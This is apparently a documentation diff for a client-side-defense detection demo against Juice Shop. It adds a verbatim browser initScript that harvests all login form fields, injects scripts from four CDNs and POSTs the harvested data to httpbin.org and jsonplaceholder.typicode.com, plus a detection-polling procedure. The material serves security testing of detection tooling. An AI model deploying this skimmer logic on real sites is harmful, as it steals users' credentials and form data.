@@ -21,10 +21,87 @@ After the infrastructure is verified (all Phase 1 Step 7 checks PASS), run the a
 
 AI assistants with browser automation tools run the attack simulation programmatically:
 
-1. **Navigate with initScript** — first navigate to `about:blank` to ensure a clean document context (avoids stale initScripts from prior navigations), then `navigate_page` to `http://$F5XC_DOMAINNAME/#/login` with an `initScript` that saves native `setInterval`, `clearInterval`, `fetch`, and `console.log` before zone.js patches them, polls for the login form fields, fills credentials via the native `HTMLInputElement.prototype.value` setter, and immediately executes the Combined Detection Script inline
+1. **Navigate with initScript** — first navigate to `about:blank` to ensure a clean document context (avoids stale initScripts from prior navigations), then `navigate_page` to `http://$F5XC_DOMAINNAME/#/login` with an `initScript` that saves native `setInterval`, `clearInterval`, `fetch`, and `console.log` before zone.js patches them, polls for the login form fields, fills credentials via the native `HTMLInputElement.prototype.value` setter, and immediately executes the Combined Detection Script inline. Use the verbatim initScript below.
 2. **Dismiss Welcome Banner** — `press_key` with `Escape` to close the Welcome Banner. On subsequent visits the banner may not appear (cookies persisted). The cookie consent dialog is dismissed automatically by the Escape key
 3. **Wait for completion** — wait 10 seconds for all CDN script load/error callbacks and fetch promise resolutions to complete
 4. **Capture evidence** — `list_console_messages` to check for `[CSD Demo] Simulation complete` and CDN load results; `list_network_requests` filtered to `script` and `fetch` types to verify HTTP status codes (`200`/`201` for success, `pending` for held requests)
+
+**Phase 2 initScript (verbatim — use exactly as written):**
+
+```javascript
+// Save native references before zone.js patches them
+var _si = window.setInterval.bind(window);
+var _ci = window.clearInterval.bind(window);
+var _fetch = window.fetch.bind(window);
+var _log = window.console.log.bind(window.console);
+
+// Poll for login form fields, fill credentials, run detection script
+var _poll = _si(function() {
+  var emailEl = document.querySelector('input[type="email"]');
+  var passEl  = document.querySelector('input[type="password"]');
+  if (emailEl && passEl) {
+    _ci(_poll);
+    // Fill credentials via native setter (bypasses zone.js)
+    var nativeSet = Object.getOwnPropertyDescriptor(
+      window.HTMLInputElement.prototype, 'value').set;
+    nativeSet.call(emailEl, 'test@example.com');
+    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
+    nativeSet.call(passEl, 'P@ssword123');
+    passEl.dispatchEvent(new Event('input', { bubbles: true }));
+
+    // Run Combined Detection Script inline using native fetch for exfil
+    (function() {
+      _log('==================================================');
+      _log('[CSD Demo] Combined Detection Script — Starting');
+      _log('==================================================');
+
+      _log('\n[Formjack] Phase 1: Form field harvesting');
+      var inputs = document.querySelectorAll('input');
+      var harvested = {};
+      inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        harvested[name] = input.value || '(empty)';
+      });
+      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+
+      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
+      var cdns = [
+        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
+        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
+        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
+        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
+      ];
+      cdns.forEach(function(cdn) {
+        var script = document.createElement('script');
+        script.src = cdn.url;
+        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
+        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
+        document.head.appendChild(script);
+        _log('[Supply Chain] Injected script tag: ' + cdn.name);
+      });
+
+      _log('\n[Exfil] Phase 3: Data exfiltration');
+      var payload = JSON.stringify({
+        type: 'combined_demo', credentials: harvested,
+        page: window.location.href, timestamp: Date.now()
+      });
+      _fetch('https://httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
+        .then(function() { _log('[Exfil] Data sent to httpbin.org'); });
+      _fetch('https://jsonplaceholder.typicode.com/posts', {
+        method: 'POST', mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' }, body: payload
+      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });
+
+      _log('\n==================================================');
+      _log('[CSD Demo] Simulation complete');
+      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
+      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
+      _log('==================================================');
+    })();
+  }
+}, 300);
+```
 
 <Aside type="caution">
 **zone.js incompatibility** — Juice Shop uses Angular's zone.js, which patches `setTimeout`, `setInterval`, `fetch`, `XMLHttpRequest`, and other browser APIs. This breaks the MCP `evaluate_script`, `fill`, and `click` tools with `Cannot read properties of undefined (reading 'call')`. Use `navigate_page` with `initScript` instead — `initScript` runs before zone.js loads, so you can save native API references and use them in polling callbacks. The initScript must fill form fields using the native `HTMLInputElement.prototype.value` setter (not `fill`) and run the detection script inline (not via `setTimeout`, which zone.js may intercept after page load). See [Trigger Detection — AI-Automated Execution](/csd/trigger-detection/#ai-automated-execution) for details.
@@ -57,7 +134,14 @@ Operators without browser automation tools perform the steps manually:
 | Data exfiltration | Sends harvested data via `fetch` to `httpbin.org` and `jsonplaceholder.typicode.com` | Network calls to external domains |
 
 <Aside type="tip">
-Detection takes **5–10 minutes** to appear in the CSD dashboard for established tenants. After a fresh infrastructure rebuild or first-time protected domain registration, allow up to **30 minutes** for the full processing pipeline to initialize. The `/detected_domains` endpoint is the leading indicator — if exfil domains appear there, the CSD pipeline is processing data even if `/scripts` and `/formFields` remain empty. Proceed to Step 9 after waiting at least 5 minutes. For additional targeted simulations (individual attack categories, maximum detection stress test), see the [Attack Script Library](/csd/attack-scripts/).
+After running the attack simulation, use this deterministic polling loop to wait for detections:
+
+1. Query `/detected_domains` every 60 seconds
+2. If DET-3 passes (exfil domains appear in `/detected_domains`), proceed to Step 9 immediately
+3. If still empty after 10 queries (10 minutes), check CSD status (Phase 1 Step 5) and protected domain registration (Phase 1 Step 6) — one of these is likely misconfigured
+4. If still empty after 30 queries (30 minutes), stop and report to operator — do not continue to Phase 3
+
+For additional targeted simulations (individual attack categories, maximum detection stress test), see the [Attack Script Library](/csd/attack-scripts/).
 </Aside>
 
 ### Evidence
@@ -78,7 +162,7 @@ If the HTTPS LB certificate is valid (`CertificateValid`), you may optionally ru
 
 ## Step 9: Detection Verification via API
 
-After waiting at least **5 minutes** (up to 30 minutes on first use or after a fresh infrastructure rebuild), query the CSD API endpoints to confirm detections appeared. These endpoints are documented in the [API Reference](/csd/api-reference/) and use the same authentication and namespace as previous steps.
+Query the CSD API endpoints to confirm detections appeared. Use the polling loop: query `/detected_domains` every 60 seconds; proceed as soon as DET-3 passes. If DET-3 does not pass after 10 minutes, check CSD configuration. If DET-3 does not pass after 30 minutes, stop and report to operator. These endpoints are documented in the [API Reference](/csd/api-reference/) and use the same authentication and namespace as previous steps.
 
 <Aside type="note">
 **Endpoint processing order:** `/detected_domains` is populated first and is the primary indicator that the CSD pipeline is working. `/scripts` and `/formFields` are populated on a slower backend processing schedule and may remain empty for 20–30 minutes even after multiple simulation runs. If `/detected_domains` shows exfil domains (`httpbin.org`, `jsonplaceholder.typicode.com`), treat the simulation as successfully detected and proceed — the DET-1 check below reflects this.
